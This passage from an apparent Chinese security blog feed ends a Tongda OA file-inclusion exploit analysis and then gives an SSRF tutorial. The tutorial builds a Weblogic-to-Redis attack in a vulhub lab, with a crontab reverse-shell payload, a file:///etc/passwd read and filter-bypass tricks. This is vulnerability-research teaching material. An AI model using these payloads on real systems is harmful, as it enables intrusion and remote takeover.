class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">function add_attach($SOURCE_FILE, $ATTACH_NAME, $MODULE, $YM, $ATTACH_SIGN, $ATTACH_ID)</span><br><span class="line">&#123;</span><br><span class="line">    $ATTACH_PARA_ARRAY &#x3D; TD::get_cache(&quot;SYS_ATTACH_PARA&quot;);</span><br><span class="line">    $ATTACH_POS_ACTIVE &#x3D; $ATTACH_PARA_ARRAY[&quot;SYS_ATTACH_POS_ACTIVE&quot;];</span><br><span class="line">    $ATTACH_PATH_ACTIVE &#x3D; $ATTACH_PARA_ARRAY[&quot;SYS_ATTACH_PATH_ACTIVE&quot;];</span><br><span class="line"></span><br><span class="line">    if (!file_exists($SOURCE_FILE)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($MODULE &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        $MODULE &#x3D; attach_sub_dir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($YM &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        $YM &#x3D; date(&quot;ym&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $PATH &#x3D; $ATTACH_PATH_ACTIVE . $MODULE;</span><br><span class="line">    if (!file_exists($PATH) || !is_dir($PATH)) &#123;</span><br><span class="line">        @mkdir($PATH, 448);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $PATH &#x3D; $PATH . &quot;&#x2F;&quot; . $YM;</span><br><span class="line">    if (!file_exists($PATH) || !is_dir($PATH)) &#123;</span><br><span class="line">        @mkdir($PATH, 448);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ATTACH_NAME &#x3D; (is_default_charset($ATTACH_NAME) ? $ATTACH_NAME : iconv(&quot;utf-8&quot;, MYOA_CHARSET, $ATTACH_NAME));</span><br><span class="line">    $EXT_NAME &#x3D; substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;));</span><br><span class="line">    $ATTACH_NAME &#x3D; str_replace($EXT_NAME, strtolower($EXT_NAME), $ATTACH_NAME);</span><br><span class="line">    $ATTACH_FILE &#x3D; (MYOA_ATTACH_NAME_FORMAT ? md5($ATTACH_NAME) . &quot;.td&quot; : $ATTACH_NAME);</span><br><span class="line">    $ATTACH_ID &#x3D; mt_rand();</span><br><span class="line">    $FILENAME &#x3D; $PATH . &quot;&#x2F;&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;</span><br><span class="line"></span><br><span class="line">    if (file_exists($FILENAME)) &#123;</span><br><span class="line">        $ATTACH_ID &#x3D; mt_rand();</span><br><span class="line">        $FILENAME &#x3D; $PATH . &quot;&#x2F;&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $AID &#x3D; mysql_insert_id();</span><br><span class="line">    $ATTACH_ID_NEW &#x3D; $AID . &quot;@&quot; . $YM . &quot;_&quot; . $ATTACH_ID;</span><br><span class="line">    return $ATTACH_ID_NEW;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>可以看到返回值 A T T A C H I D N E W 有 三 部 分 组 成 ATTACH_ID_NEW有三部分组成 ATTACHI​DN​EW有三部分组成AID， Y M ， YM， YM，ATTACH_ID</p></li><li><p>其实UPLOAD_MODE值随便为1，2，3中的任意一个数字，都可以返回文件名字和部分路径，不看也行</p></li></ul><h2 id="文件包含部分"><a href="#文件包含部分" class="headerlink" title="文件包含部分"></a>文件包含部分</h2><ul><li>这个比较简单</li><li>文件包含功能的文件位于webroot\ispirit\interface\gateway.php</li><li>具体代码如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;decode by http:&#x2F;&#x2F;dezend.qiling.org  QQ 2859470</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line">include_once &#39;inc&#x2F;session.php&#39;;</span><br><span class="line">include_once &#39;inc&#x2F;conn.php&#39;;</span><br><span class="line">include_once &#39;inc&#x2F;utility_org.php&#39;;</span><br><span class="line">if ($P !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;[^a-z0-9;]+&#x2F;i&#39;, $P)) &#123;</span><br><span class="line">        echo _(&#39;非法参数&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">    if ($_SESSION[&#39;LOGIN_USER_ID&#39;] &#x3D;&#x3D; &#39;&#39; || $_SESSION[&#39;LOGIN_UID&#39;] &#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">        echo _(&#39;RELOGIN&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($json) &#123;</span><br><span class="line">    $json &#x3D; stripcslashes($json);</span><br><span class="line">    $json &#x3D; (array) json_decode($json);</span><br><span class="line">    foreach ($json as $key &#x3D;&gt; $val) &#123;</span><br><span class="line">        if ($key &#x3D;&#x3D; &#39;data&#39;) &#123;</span><br><span class="line">            $val &#x3D; (array) $val;</span><br><span class="line">            foreach ($val as $keys &#x3D;&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($key &#x3D;&#x3D; &#39;url&#39;) &#123;</span><br><span class="line">            $url &#x3D; $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($url !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">        if (substr($url, 0, 1) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">            $url &#x3D; substr($url, 1);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strpos($url, &#39;general&#x2F;&#39;) !&#x3D;&#x3D; false || strpos($url, &#39;ispirit&#x2F;&#39;) !&#x3D;&#x3D; false || strpos($url, &#39;module&#x2F;&#39;) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">            include_once $url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这里的参数也是，POST直接传入就可以了，分析在上面也有主要是有这两个个就可以</p></li><li><pre><code>include_once &apos;inc/session.php&apos;;include_once &apos;inc/conn.php&apos;;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- 逻辑较为简单，</span><br><span class="line"></span><br><span class="line">- 如果这里不传递参数P为空，就以绕过前面一系列的检测直</span><br><span class="line"></span><br><span class="line">- 随后从json中获取url参数的值</span><br><span class="line"></span><br><span class="line">- 只有 general&#x2F;、ispirit&#x2F;、module&#x2F; 在url内，在直接包含 \$url,</span><br><span class="line"></span><br><span class="line">- 文件包含结束</span><br><span class="line"></span><br><span class="line">构造一个就好了</span><br></pre></td></tr></table></figure>/ispirit/interface/gateway.php?json={&quot;url&quot;:&quot;/general/../../attach/im/2003/1153189608.jpg&quot;}</code></pre></li></ul><p>0x03 修复方案</p><ul><li>更新官方发布的补丁 <a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">http://www.tongda2000.com/news/673.php</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈SSRF 加redis反弹shell</title>
      <link href="/2020/03/22/%E6%B5%85%E8%B0%88SSRF%20%E5%8A%A0redis%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2020/03/22/%E6%B5%85%E8%B0%88SSRF%20%E5%8A%A0redis%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-SSRF简介和原理"><a href="#0x00-SSRF简介和原理" class="headerlink" title="0x00 SSRF简介和原理"></a>0x00 SSRF简介和原理</h1><ul><li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</li><li>通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</li></ul><h1 id="0x01-漏洞危害"><a href="#0x01-漏洞危害" class="headerlink" title="0x01 漏洞危害"></a>0x01 漏洞危害</h1><ol><li><p>扫描内网开放服务</p></li><li><p>向内部任意主机的任意端口发送payload来攻击内网服务</p></li><li><p>攻击内网的web应用，例如直接SQL注入、XSS攻击等</p></li><li><p>利用file、gopher、dict协议读取本地文件、执行命令等</p></li></ol><h1 id="0x02-漏洞常出现的地方"><a href="#0x02-漏洞常出现的地方" class="headerlink" title="0x02 漏洞常出现的地方"></a>0x02 漏洞常出现的地方</h1><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h1 id="0x03漏洞验证"><a href="#0x03漏洞验证" class="headerlink" title="0x03漏洞验证"></a>0x03漏洞验证</h1><p>1、排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php\?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php\?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p><p>2、dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p><p>3、抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p><p>​ 3.1、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>​ 3.2、通过二级域名暴力猜解工具模糊猜测内网地址</p><p>​ 3.3、通过file协议读取内网信息获取相关地址</p><p>4、直接返回的Banner、title、content等信息</p><p>5、留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p><h1 id="0x04简单的测试用例"><a href="#0x04简单的测试用例" class="headerlink" title="0x04简单的测试用例"></a>0x04简单的测试用例</h1><h3 id="创建一个PHP测试脚本，利用curl发送请求"><a href="#创建一个PHP测试脚本，利用curl发送请求" class="headerlink" title="创建一个PHP测试脚本，利用curl发送请求"></a>创建一个PHP测试脚本，利用curl发送请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$ch &#x3D; curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line"></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="利用的多种协议"><a href="#利用的多种协议" class="headerlink" title="利用的多种协议"></a>利用的多种协议</h3><h4 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用gopher协议来查看协议，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_godzzz</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104714726.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用gopher发送POST的请求，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104735953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict 协议探测版本</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104817808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>FILE协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>http/https协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;ip:port</span><br></pre></td></tr></table></figure><h1 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h1><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><ul><li>如果内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，可以直接反弹shell获取权限</li><li>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</li><li>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</li></ul><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><h3 id="参考vulhub的漏洞环境搭建"><a href="#参考vulhub的漏洞环境搭建" class="headerlink" title="参考vulhub的漏洞环境搭建"></a>参考vulhub的漏洞环境搭建</h3><p>装个docker方便的很</p><p>docker-compose.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: vulhub&#x2F;weblogic</span><br><span class="line">   depends_on:</span><br><span class="line">    - redis</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;7001:7001&quot;</span><br><span class="line"> redis:</span><br><span class="line">   build: .</span><br></pre></td></tr></table></figure><p>编译及启动测试环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p><h3 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h3><p>SSRF漏洞存在于</p><p><code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p>1.比如探测自己的 7001端口，这是存在的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020032210495411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>2.比如这个 探测 172.19.0.2:6379是否开放，这种报错就是开放的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322105012614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>2.比如这个 探测 127.0.0.1:7000是否开放，这种报错就是不存在的端口</p><p><img src="https://img-blog.csdnimg.cn/20200322105029385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="攻击redis（通过header-CRLF-注入）"><a href="#攻击redis（通过header-CRLF-注入）" class="headerlink" title="攻击redis（通过header CRLF 注入）"></a><strong>攻击redis（通过header CRLF 注入）</strong></h3><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p><h4 id="查看docker-redis的ip地址"><a href="#查看docker-redis的ip地址" class="headerlink" title="查看docker redis的ip地址"></a><strong>查看docker redis的ip地址</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">docker exec -it c5e88c76db40 ip addr</span><br><span class="line"></span><br><span class="line">172.19.0.2是docker redis的内网地址</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322105119457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A7ZX0fPU-1584844899988)(/Users/zy/Library/Application Support/typora-user-images/image-20200317210632447.png)]"></p><h4 id="利用SSRF漏洞探测内网redis是否开放"><a href="#利用SSRF漏洞探测内网redis是否开放" class="headerlink" title="利用SSRF漏洞探测内网redis是否开放"></a>利用SSRF漏洞探测内网redis是否开放</h4><p>发现redis存在</p><p><img src="https://img-blog.csdnimg.cn/20200322105157613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-AK6eRaxz-1584844899989)(/Users/zy/Library/Application Support/typora-user-images/image-20200317211405238.png)]"></p><h4 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h4><p>发送三条redis命令，将弹shell脚本写入<code>/etc/crontab</code>：</p><p>写成计划任务，然后反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.0.1&#x2F;21 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p>进行url编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>注意，换行符是“\r\n”，也就是“%0D%0A”。</p><h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a><strong>实施攻击</strong></h4><p>本机监听端口：nc -lvvp 2333</p><p>注意IP要填对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp 这个肯定是weblogic的能访问的地方了</span><br><span class="line"></span><br><span class="line">operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;  这个是redis的IP和端口</span><br><span class="line"></span><br><span class="line">最后一个ip</span><br><span class="line">192.168.0.100%2F2333  这个是要反弹shell的主机ip和端口</span><br></pre></td></tr></table></figure><p>浏览器访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.100%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>反弹shell成功！<br><img src="https://img-blog.csdnimg.cn/20200322105240681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x06-绕过技术"><a href="#0x06-绕过技术" class="headerlink" title="0x06 绕过技术"></a>0x06 绕过技术</h1><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><p><strong>1.@</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;abc@127.0.0.1</span><br><span class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</span><br><span class="line">http:&#x2F;&#x2F;8.8.8.8@127.0.0.1:8080、http:&#x2F;&#x2F;127.0.0.1#8.8.8.8</span><br></pre></td></tr></table></figure><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br>在PHP的<code>parse_url</code>中会识别<a href="http://www.ccc.com，而`libcur`l则识别为www.bbb.com" target="_blank" rel="noopener">www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br><strong>2.利用[::]</strong><br>可以利用<code>[::]</code>来绕过localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>3.利用短网址</strong></p><p>站长工具短网址(<a href="http://tool.chinaz.com/tools/dwz.aspx\" target="_blank" rel="noopener">http://tool.chinaz.com/tools/dwz.aspx\</a>)<br>跳转要去的地址</p><p><strong>4.利用特殊域名</strong><br>原理是DNS解析。xip.io可以指向任意域名，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1.xip.io，可解析为127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>5.利用DNS解析</strong></p><p>在域名上设置A记录，指向127.0.0.1</p><p><strong>6.302跳转</strong></p><p>使用302跳转地址</p><p><strong>7.利用进制转换</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">八进制：0177.0.0.1</span><br><span class="line">十六进制：0x7f.0.0.1</span><br><span class="line">十进制：2130706433</span><br></pre></td></tr></table></figure><p><strong>8.句号</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  